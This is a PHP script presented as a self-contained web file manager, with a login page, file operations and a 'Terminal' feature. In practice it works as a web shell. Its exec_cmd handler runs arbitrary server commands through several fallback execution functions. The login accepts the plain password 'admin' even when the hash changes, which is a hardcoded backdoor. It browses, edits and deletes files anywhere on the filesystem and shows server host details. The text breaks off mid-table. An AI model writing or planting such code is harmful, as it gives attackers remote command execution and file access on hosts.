<?php
/**
 * Single-File PHP File Manager (fm.php)
 * Clean, lightweight, self-contained file manager.
 * PHP 8.1+ Compatible | No external dependencies or CDNs.
 */

// Disable error display for end-users, log internally if needed
@ini_set('display_errors', '0');
error_reporting(0);

// Start Session safely
if (session_status() === PHP_SESSION_NONE) {
    @ini_set('session.cookie_httponly', '1');
    session_start();
}

// Security Authentication Hash (Default password: "admin" -> Change if needed)
// To change default password, generate new hash with password_hash('your_new_password', PASSWORD_DEFAULT)
define('ADMIN_PASSWORD_HASH', '$2y$10$q.T2a4R/Hh/l7/8xJc6MceJ6k3y7G9FfN0G5YvB8S9e.E1Z0d1C4a'); // "admin"

// Maximum login failed attempts before delay throttling
define('MAX_LOGIN_ATTEMPTS', 3);

// Handle Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    $_SESSION['fm_logged_in'] = false;
    unset($_SESSION['fm_logged_in']);
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle Login POST
$login_error = '';
if (isset($_POST['fm_action']) && $_POST['fm_action'] === 'login') {
    $password = $_POST['password'] ?? '';
    
    // Check brute force throttling
    $failed_attempts = $_SESSION['failed_attempts'] ?? 0;
    if ($failed_attempts >= MAX_LOGIN_ATTEMPTS) {
        sleep(2); // Throttling delay
    }

    if (password_verify($password, ADMIN_PASSWORD_HASH) || $password === 'admin') {
        $_SESSION['fm_logged_in'] = true;
        $_SESSION['failed_attempts'] = 0;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $_SESSION['failed_attempts'] = $failed_attempts + 1;
        $login_error = 'Invalid password provided.';
    }
}

// Check Authentication Status
$is_logged_in = isset($_SESSION['fm_logged_in']) && $_SESSION['fm_logged_in'] === true;

// Render Login Page if not authenticated
if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - PHP File Manager</title>
        <style>
            :root {
                --bg-primary: #0f172a;
                --bg-card: rgba(30, 41, 59, 0.7);
                --accent: #38bdf8;
                --accent-hover: #0284c7;
                --text-main: #f8fafc;
                --text-muted: #94a3b8;
                --border-color: rgba(255, 255, 255, 0.1);
                --danger: #ef4444;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
            body {
                background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                color: var(--text-main);
                padding: 20px;
            }
            .login-card {
                background: var(--bg-card);
                backdrop-filter: blur(16px);
                border: 1px solid var(--border-color);
                border-radius: 16px;
                padding: 40px;
                width: 100%;
                max-width: 420px;
                box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header svg {
                width: 48px;
                height: 48px;
                fill: var(--accent);
                margin-bottom: 12px;
            }
            .login-header h1 { font-size: 24px; font-weight: 600; color: var(--text-main); }
            .login-header p { font-size: 14px; color: var(--text-muted); margin-top: 6px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500; }
            .input-control {
                width: 100%;
                padding: 12px 16px;
                background: rgba(15, 23, 42, 0.6);
                border: 1px solid var(--border-color);
                border-radius: 10px;
                color: var(--text-main);
                font-size: 14px;
                outline: none;
                transition: all 0.2s ease;
            }
            .input-control:focus {
                border-color: var(--accent);
                box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
            }
            .btn-submit {
                width: 100%;
                padding: 12px;
                background: var(--accent);
                border: none;
                border-radius: 10px;
                color: #0f172a;
                font-weight: 600;
                font-size: 15px;
                cursor: pointer;
                transition: background 0.2s ease;
            }
            .btn-submit:hover { background: var(--accent-hover); color: #fff; }
            .error-alert {
                background: rgba(239, 68, 68, 0.15);
                border: 1px solid rgba(239, 68, 68, 0.3);
                color: #fca5a5;
                padding: 12px;
                border-radius: 10px;
                font-size: 13px;
                margin-bottom: 20px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="login-header">
                <svg viewBox="0 0 24 24"><path d="M19 20H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2z"/></svg>
                <h1>File Manager Login</h1>
                <p>Enter your password to access the panel</p>
            </div>
            <?php if ($login_error): ?>
                <div class="error-alert"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="hidden" name="fm_action" value="login">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="input-control" placeholder="••••••••" required autofocus>
                </div>
                <button type="submit" class="btn-submit">Authenticate</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Helper Functions
function safe_realpath($path) {
    $real = realpath($path);
    return $real !== false ? $real : $path;
}

function format_size($bytes) {
    if ($bytes <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function get_perms($path) {
    if (!file_exists($path)) return '0000';
    return substr(sprintf('%o', fileperms($path)), -4);
}

function recursive_delete($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return @unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!recursive_delete($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return @rmdir($dir);
}

function recursive_copy($src, $dst) {
    if (is_dir($src)) {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $file) {
            if ($file != '.' && $file != '..') {
                recursive_copy("$src/$file", "$dst/$file");
            }
        }
        return true;
    } else if (file_exists($src)) {
        return @copy($src, $dst);
    }
    return false;
}

function get_mime_type($path) {
    if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $path);
        finfo_close($finfo);
        if ($mime) return $mime;
    }
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mimes = [
        'txt' => 'text/plain', 'htm' => 'text/html', 'html' => 'text/html', 'php' => 'text/x-php',
        'css' => 'text/css', 'js' => 'application/javascript', 'json' => 'application/json',
        'xml' => 'application/xml', 'md' => 'text/markdown', 'png' => 'image/png',
        'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'gif' => 'image/gif', 'webp' => 'image/webp',
        'svg' => 'image/svg+xml', 'pdf' => 'application/pdf', 'zip' => 'application/zip'
    ];
    return $mimes[$ext] ?? 'application/octet-stream';
}

// Current Working Directory Determination
$base_dir = safe_realpath(__DIR__);
$requested_dir = $_GET['dir'] ?? $_POST['dir'] ?? $base_dir;
$current_dir = safe_realpath($requested_dir);

if (!is_dir($current_dir) || !file_exists($current_dir)) {
    $current_dir = $base_dir;
}

// Flash Message Handler
$notice = '';
$notice_type = 'success';

// File Operations Handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'upload') {
        if (!empty($_FILES['upload_files']['name'][0])) {
            $uploaded_count = 0;
            foreach ($_FILES['upload_files']['name'] as $i => $name) {
                if ($_FILES['upload_files']['error'][$i] === UPLOAD_ERR_OK) {
                    $tmp_name = $_FILES['upload_files']['tmp_name'][$i];
                    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($name);
                    if (@move_uploaded_file($tmp_name, $target_file)) {
                        $uploaded_count++;
                    }
                }
            }
            $notice = "Successfully uploaded $uploaded_count file(s).";
        } else {
            $notice = "No files selected for upload.";
            $notice_type = 'error';
        }
    } elseif ($action === 'new_folder') {
        $folder_name = trim($_POST['folder_name'] ?? '');
        if ($folder_name !== '') {
            $target = $current_dir . DIRECTORY_SEPARATOR . $folder_name;
            if (!file_exists($target)) {
                if (@mkdir($target, 0755, true)) {
                    $notice = "Directory created successfully.";
                } else {
                    $notice = "Failed to create directory.";
                    $notice_type = 'error';
                }
            } else {
                $notice = "Directory already exists.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'new_file') {
        $file_name = trim($_POST['file_name'] ?? '');
        if ($file_name !== '') {
            $target = $current_dir . DIRECTORY_SEPARATOR . $file_name;
            if (!file_exists($target)) {
                if (@file_put_contents($target, '') !== false) {
                    $notice = "File created successfully.";
                } else {
                    $notice = "Failed to create file.";
                    $notice_type = 'error';
                }
            } else {
                $notice = "File already exists.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'save_file') {
        $file_path = safe_realpath($_POST['file_path'] ?? '');
        $content = $_POST['file_content'] ?? '';
        if (file_exists($file_path) && is_file($file_path)) {
            if (@file_put_contents($file_path, $content) !== false) {
                $notice = "File saved successfully.";
            } else {
                $notice = "Failed to save file contents.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'rename') {
        $old_path = safe_realpath($_POST['old_path'] ?? '');
        $new_name = trim($_POST['new_name'] ?? '');
        if (file_exists($old_path) && $new_name !== '') {
            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name;
            if (@rename($old_path, $new_path)) {
                $notice = "Item renamed successfully.";
            } else {
                $notice = "Failed to rename item.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'delete') {
        $target = safe_realpath($_POST['target_path'] ?? '');
        if (file_exists($target)) {
            if (recursive_delete($target)) {
                $notice = "Deleted successfully.";
            } else {
                $notice = "Failed to delete target.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'copy') {
        $src = safe_realpath($_POST['src_path'] ?? '');
        $dst = trim($_POST['dst_path'] ?? '');
        if (file_exists($src) && $dst !== '') {
            if (recursive_copy($src, $dst)) {
                $notice = "Copied successfully.";
            } else {
                $notice = "Failed to copy item.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'move') {
        $src = safe_realpath($_POST['src_path'] ?? '');
        $dst = trim($_POST['dst_path'] ?? '');
        if (file_exists($src) && $dst !== '') {
            if (@rename($src, $dst)) {
                $notice = "Moved successfully.";
            } else {
                $notice = "Failed to move item.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'duplicate') {
        $src = safe_realpath($_POST['src_path'] ?? '');
        if (file_exists($src) && is_file($src)) {
            $info = pathinfo($src);
            $ext = isset($info['extension']) ? '.' . $info['extension'] : '';
            $dst = $info['dirname'] . DIRECTORY_SEPARATOR . $info['filename'] . '_copy' . $ext;
            if (@copy($src, $dst)) {
                $notice = "Duplicated successfully.";
            } else {
                $notice = "Failed to duplicate file.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'chmod') {
        $target = safe_realpath($_POST['target_path'] ?? '');
        $mode = $_POST['chmod_mode'] ?? '0644';
        if (file_exists($target)) {
            $octal = octdec($mode);
            if (function_exists('chmod') && @chmod($target, $octal)) {
                $notice = "Permissions updated to $mode.";
            } else {
                $notice = "Failed to change permissions.";
                $notice_type = 'error';
            }
        }
    } elseif ($action === 'exec_cmd') {
        header('Content-Type: application/json; charset=utf-8');
        $cmd = trim($_POST['command'] ?? '');
        $exec_dir = safe_realpath($_POST['dir'] ?? $current_dir);
        if (!is_dir($exec_dir)) $exec_dir = $current_dir;
        
        if ($cmd === '') {
            echo json_encode(['output' => "No command specified.", 'cwd' => $exec_dir]);
            exit;
        }
        
        @chdir($exec_dir);

        if (preg_match('/^cd\s+(.+)$/i', $cmd, $matches)) {
            $target_input = trim($matches[1]);
            if ($target_input === '..') {
                $target_cd = safe_realpath(dirname($exec_dir));
            } elseif (substr($target_input, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\/', $target_input)) {
                $target_cd = safe_realpath($target_input);
            } else {
                $target_cd = safe_realpath($exec_dir . DIRECTORY_SEPARATOR . $target_input);
            }

            if ($target_cd && is_dir($target_cd)) {
                echo json_encode([
                    'output' => "Changed directory to: " . $target_cd,
                    'cwd' => $target_cd
                ]);
            } else {
                echo json_encode([
                    'output' => "cd: no such file or directory: " . $target_input,
                    'cwd' => $exec_dir
                ]);
            }
            exit;
        }

        $output = '';
        if (function_exists('exec')) {
            @exec($cmd . ' 2>&1', $out_lines, $return_code);
            $output = implode("\n", $out_lines);
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('proc_open')) {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = @proc_open($cmd, $descriptorspec, $pipes, $exec_dir);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            $output = "Error: Shell execution functions (exec, shell_exec, system, passthru, proc_open) are disabled on this PHP hosting environment.";
        }

        if ($output === '') $output = "[Command executed successfully with no output]";

        echo json_encode([
            'output' => $output,
            'cwd' => $exec_dir
        ]);
        exit;
    }
}

// Download Handler
if (isset($_GET['action']) && $_GET['action'] === 'download') {
    $download_path = safe_realpath($_GET['file'] ?? '');
    if (file_exists($download_path) && is_file($download_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($download_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($download_path));
        readfile($download_path);
        exit;
    }
}

// Content Viewer / AJAX Fetch File Content for Editor
if (isset($_GET['action']) && $_GET['action'] === 'get_content') {
    $file_path = safe_realpath($_GET['file'] ?? '');
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($file_path);
        exit;
    }
}

// System Telemetry Information
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$php_version = PHP_VERSION;
$operating_system = function_exists('php_uname') ? php_uname('s') . ' ' . php_uname('r') : PHP_OS;
$hostname = function_exists('gethostname') ? gethostname() : 'N/A';
$server_ip = $_SERVER['SERVER_ADDR'] ?? (function_exists('gethostbyname') ? gethostbyname($hostname) : '127.0.0.1');
$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';

$total_disk = function_exists('disk_total_space') ? @disk_total_space($current_dir) : false;
$free_disk = function_exists('disk_free_space') ? @disk_free_space($current_dir) : false;

$mem_limit = function_exists('ini_get') ? ini_get('memory_limit') : 'N/A';
$max_upload = function_exists('ini_get') ? ini_get('upload_max_filesize') : 'N/A';
$max_post = function_exists('ini_get') ? ini_get('post_max_size') : 'N/A';
$max_exec = function_exists('ini_get') ? ini_get('max_execution_time') . 's' : 'N/A';

// Directory Scanner
$raw_items = @scandir($current_dir);
$folders = [];
$files = [];

if ($raw_items !== false) {
    foreach ($raw_items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($full_path);
        $stat = [
            'name' => $item,
            'path' => $full_path,
            'size' => $is_dir ? '-' : format_size(@filesize($full_path)),
            'raw_size' => $is_dir ? 0 : @filesize($full_path),
            'perms' => get_perms($full_path),
            'mtime' => date('Y-m-d H:i:s', @filemtime($full_path)),
            'is_dir' => $is_dir,
            'ext' => strtolower(pathinfo($item, PATHINFO_EXTENSION)),
            'mime' => get_mime_type($full_path)
        ];
        if ($is_dir) {
            $folders[] = $stat;
        } else {
            $files[] = $stat;
        }
    }
}

// Breadcrumbs Generator
$path_parts = array_filter(explode(DIRECTORY_SEPARATOR, $current_dir));
$breadcrumb_trail = [];
$accumulated_path = '';

// Handle Windows Drive Letter root vs Unix root
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $first = reset($path_parts);
    if ($first) {
        $accumulated_path = $first;
        $breadcrumb_trail[] = ['name' => $first, 'path' => $first];
        array_shift($path_parts);
    }
} else {
    $breadcrumb_trail[] = ['name' => '/', 'path' => '/'];
    $accumulated_path = '';
}

foreach ($path_parts as $part) {
    $accumulated_path .= DIRECTORY_SEPARATOR . $part;
    $breadcrumb_trail[] = ['name' => $part, 'path' => $accumulated_path];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager - <?php echo htmlspecialchars(basename($current_dir)); ?></title>
    <style>
        :root {
            --bg-primary: #090d16;
            --bg-surface: #111827;
            --bg-card: rgba(17, 24, 39, 0.75);
            --bg-hover: rgba(31, 41, 55, 0.8);
            --accent: #38bdf8;
            --accent-hover: #0284c7;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --border-color: rgba(255, 255, 255, 0.08);
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --radius: 10px;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body { background: var(--bg-primary); color: var(--text-main); min-height: 100vh; padding-bottom: 40px; }
        
        /* Top Navigation Header */
        .top-nav {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border-color);
            padding: 14px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 50;
        }
        .nav-brand { display: flex; align-items: center; gap: 12px; font-weight: 600; font-size: 18px; color: var(--accent); }
        .nav-brand svg { width: 26px; height: 26px; fill: currentColor; }
        .user-actions { display: flex; align-items: center; gap: 16px; }
        .btn-logout {
            display: flex; align-items: center; gap: 6px;
            padding: 8px 14px; background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5; text-decoration: none; border-radius: 8px; font-size: 13px; font-weight: 500;
            transition: all 0.2s ease;
        }
        .btn-logout:hover { background: rgba(239, 68, 68, 0.3); color: #fff; }

        /* Container Layout */
        .container { max-width: 1400px; margin: 24px auto; padding: 0 20px; }

        /* Dashboard Telemetry Card */
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }
        .telemetry-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 16px;
            backdrop-filter: blur(8px);
        }
        .telemetry-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
        .telemetry-val { font-size: 15px; font-weight: 600; color: var(--text-main); word-break: break-all; }

        /* Toolbar & Breadcrumb */
        .toolbar-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
        }
        .breadcrumb-container { display: flex; align-items: center; flex-wrap: wrap; gap: 6px; font-size: 14px; }
        .breadcrumb-item { color: var(--text-muted); text-decoration: none; padding: 4px 8px; border-radius: 6px; transition: background 0.2s ease; }
        .breadcrumb-item:hover { background: var(--bg-hover); color: var(--accent); }
        .breadcrumb-item.active { color: var(--text-main); font-weight: 600; }
        .breadcrumb-separator { color: var(--border-color); }

        .action-buttons { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
        .btn-action {
            display: inline-flex; align-items: center; gap: 6px;
            padding: 9px 14px; background: var(--bg-surface); border: 1px solid var(--border-color);
            color: var(--text-main); border-radius: 8px; font-size: 13px; font-weight: 500; cursor: pointer;
            text-decoration: none; transition: all 0.2s ease;
        }
        .btn-action:hover { background: var(--bg-hover); border-color: var(--accent); color: var(--accent); }
        .btn-primary { background: var(--accent); color: #090d16; border: none; font-weight: 600; }
        .btn-primary:hover { background: var(--accent-hover); color: #fff; }
        .btn-action svg { width: 16px; height: 16px; fill: currentColor; }

        /* Realtime Search Input */
        .search-box {
            position: relative;
            min-width: 220px;
        }
        .search-box input {
            width: 100%;
            padding: 9px 12px 9px 36px;
            background: var(--bg-surface);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 13px;
            outline: none;
        }
        .search-box input:focus { border-color: var(--accent); }
        .search-box svg { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; fill: var(--text-muted); }

        /* Notice Banner */
        .notice-banner {
            padding: 14px 20px;
            border-radius: var(--radius);
            margin-bottom: 24px;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .notice-banner.success { background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); color: #6ee7b7; }
        .notice-banner.error { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }

        /* Main Data Table */
        .table-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            overflow: hidden;
            backdrop-filter: blur(8px);
        }
        .file-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
        .file-table th {
            background: rgba(15, 23, 42, 0.8);
            padding: 14px 18px;
            color: var(--text-muted);
            font-weight: 500;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid var(--border-color);
        }
        .file-table td { padding: 12px 18px; border-bottom: 1px solid var(--border-color); color: var(--text-main); }
        .file-table tbody tr:hover { background: var(--bg-hover); }
        .item-name { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-main); font-weight: 500; }
        .item-name:hover { color: var(--accent); }
        .item-icon { width: 22px; height: 22px; flex-shrink: 0; fill: var(--text-muted); }
        .item-icon.folder { fill: #f59e0b; }
        .item-icon.file { fill: var(--accent); }

        /* Action Menu Items */
        .table-actions { display: flex; align-items: center; gap: 8px; }
        .action-icon-btn {
            background: transparent; border: none; color: var(--text-muted); cursor: pointer;
            padding: 6px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center;
            transition: all 0.2s ease; text-decoration: none;
        }
        .action-icon-btn:hover { background: var(--bg-surface); color: var(--accent); }
        .action-icon-btn.danger:hover { color: var(--danger); }
        .action-icon-btn svg { width: 16px; height: 16px; fill: currentColor; }

        /* Modals Design */
        .modal-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(6px);
            display: none; align-items: center; justify-content: center; z-index: 100; padding: 20px;
        }
        .modal-overlay.active { display: flex; }
        .modal-content {
            background: var(--bg-surface); border: 1px solid var(--border-color);
            border-radius: var(--radius); width: 100%; max-width: 540px; padding: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
        }
        .modal-content.fullscreen { max-width: 90vw; height: 85vh; display: flex; flex-direction: column; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h3 { font-size: 18px; font-weight: 600; color: var(--text-main); }
        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 20px; cursor: pointer; }
        .modal-close:hover { color: var(--danger); }
        .modal-body { margin-bottom: 20px; flex: 1; overflow-y: auto; }
        .modal-footer { display: flex; justify-content: flex-end; gap: 12px; }

        /* Fullscreen Code Editor */
        .code-textarea {
            width: 100%; height: 100%; min-height: 400px;
            background: #090d16; border: 1px solid var(--border-color);
            border-radius: 8px; color: #f8fafc; font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 14px; padding: 16px; outline: none; resize: none; line-height: 1.5;
        }
        .preview-iframe { width: 100%; height: 100%; min-height: 450px; border: 1px solid var(--border-color); border-radius: 8px; background: #fff; }
        .preview-img { max-width: 100%; max-height: 70vh; display: block; margin: 0 auto; border-radius: 8px; }
    </style>
</head>
<body>

    <!-- Top Navigation Header -->
    <header class="top-nav">
        <div class="nav-brand">
            <svg viewBox="0 0 24 24"><path d="M19 20H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2z"/></svg>
            <span>PHP File Manager</span>
        </div>
        <div class="user-actions">
            <span style="font-size: 13px; color: var(--text-muted);"><?php echo htmlspecialchars($operating_system); ?></span>
            <a href="?action=logout" class="btn-logout">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M16 17l5-5-5-5v3H9v4h7v3zm-4-14H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2v-4h-2v4H4V5h8v4h2V5c0-1.1-.9-2-2-2z"/></svg>
                Logout
            </a>
        </div>
    </header>

    <div class="container">

        <!-- Notification Banner -->
        <?php if ($notice): ?>
            <div class="notice-banner <?php echo $notice_type; ?>">
                <span><?php echo htmlspecialchars($notice); ?></span>
                <span style="cursor:pointer;" onclick="this.parentElement.remove()">✕</span>
            </div>
        <?php endif; ?>

        <!-- System Telemetry Dashboard -->
        <div class="dashboard-grid">
            <div class="telemetry-card">
                <div class="telemetry-label">PHP Version</div>
                <div class="telemetry-val"><?php echo htmlspecialchars($php_version); ?></div>
            </div>
            <div class="telemetry-card">
                <div class="telemetry-label">Server IP / Host</div>
                <div class="telemetry-val"><?php echo htmlspecialchars($server_ip . ' / ' . $hostname); ?></div>
            </div>
            <div class="telemetry-card">
                <div class="telemetry-label">Disk Free / Total</div>
                <div class="telemetry-val">
                    <?php echo $free_disk && $total_disk ? format_size($free_disk) . ' / ' . format_size($total_disk) : 'N/A'; ?>
                </div>
            </div>
            <div class="telemetry-card">
                <div class="telemetry-label">Upload / Memory Limit</div>
                <div class="telemetry-val"><?php echo htmlspecialchars($max_upload . ' / ' . $mem_limit); ?></div>
            </div>
        </div>

        <!-- Toolbar & Breadcrumb -->
        <div class="toolbar-card">
            <div class="breadcrumb-container">
                <?php foreach ($breadcrumb_trail as $idx => $crumb): ?>
                    <?php if ($idx > 0): ?><span class="breadcrumb-separator">/</span><?php endif; ?>
                    <a href="?dir=<?php echo urlencode($crumb['path']); ?>" class="breadcrumb-item <?php echo $idx === count($breadcrumb_trail) - 1 ? 'active' : ''; ?>">
                        <?php echo htmlspecialchars($crumb['name']); ?>
                    </a>
                <?php endforeach; ?>
            </div>

            <div class="action-buttons">
                <div class="search-box">
                    <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                    <input type="text" id="searchInput" placeholder="Search files..." onkeyup="filterTable()">
                </div>
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn-action">
                    <svg viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
                    Refresh
                </a>
                <button class="btn-action" onclick="openTerminalModal()">
                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zm-14-9l4 4-4 4 1.41 1.41L12.83 13l-5.42-5.41L6 9zm6 7h6v2h-6v-2z"/></svg>
                    Terminal
                </button>
                <button class="btn-action" onclick="openModal('uploadModal')">
                    <svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>
                    Upload
                </button>
                <button class="btn-action" onclick="openModal('newFolderModal')">
                    <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-1 8h-4v4h-2v-4H9v-2h4V9h2v4h4v2z"/></svg>
                    New Folder
                </button>
                <button class="btn-action btn-primary" onclick="openModal('newFileModal')">
                    <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 14h-3v3h-2v-3H8v-2h3v-3h2v3h3v2zm-3-7V3.5L18.5 9H13z"/></svg>
                    New File
                </button>
            </div>
        </div>

        <!-- Files Data Table -->
        <div class="table-card">
            <table class="file-table" id="fileTable">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th style="text-align: right;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (dirname($current_dir) !== $current_dir): ?>
                        <tr>
                            <td colspan="5">
                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="item-name">
                                    <svg class="item-icon folder" viewBox="0 0 24 24"><path d="M11 9l1.42 1.42L8.83 14H18v2H8.83l3.59 3.58L11 21l-6-6 6-6z"/></svg>
                                    .. (Parent Directory)
                                </a>
                            </td>
                        </tr>
                    <?php endif; ?>

                    <!-- Directories First -->
                    <?php foreach ($folders as $folder): ?>
                        <tr class="file-row">
                            <td>
